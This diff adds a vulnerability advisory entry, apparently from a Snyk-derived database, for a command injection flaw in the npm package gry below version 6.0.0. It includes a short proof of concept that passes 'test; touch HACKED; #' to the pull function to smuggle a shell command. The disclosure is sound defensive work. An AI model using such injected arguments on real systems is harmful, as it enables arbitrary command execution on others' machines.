@@ -1,0 +1,37 @@
+---
+- id: snykio:npm:gry:566987
+  title: Command Injection
+  description: |
+    [gry][1] is a minimalist NodeJS wrapper for the git commands. `gry`
+    stands for the Git Repository.
+
+    Affected versions of this package are vulnerable to Command Injection in
+    `lib/index.js` and `example.js`
+
+    ### PoC   {#poc}
+
+        // poc.js
+        const Repo = require("gry");
+        var myRepo = new Repo(".");
+        myRepo.pull('test; touch HACKED; #', function(){console.log('Finished!')})
+
+
+
+    [1]: https://www.npmjs.com/package/gry
+  affected_package: gry
+  vulnerable_versions:
+  - "<6.0.0"
+  severity: high
+  package_manager: npm
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-04-17
+  created_date: 2020-04-17
+  last_modified_date: 2020-04-17
+  credit:
+  - Mik317
+  references:
+  - https://github.com/IonicaBizau/node-gry/commit/5108446c1e23960d65e8b973f1d9486f9f9dbd6c
+  - https://github.com/IonicaBizau/node-gry/issues/21
+  - https://github.com/IonicaBizau/node-gry/pull/22
+  source_url: https://snyk.io/vuln/SNYK-JS-GRY-566987
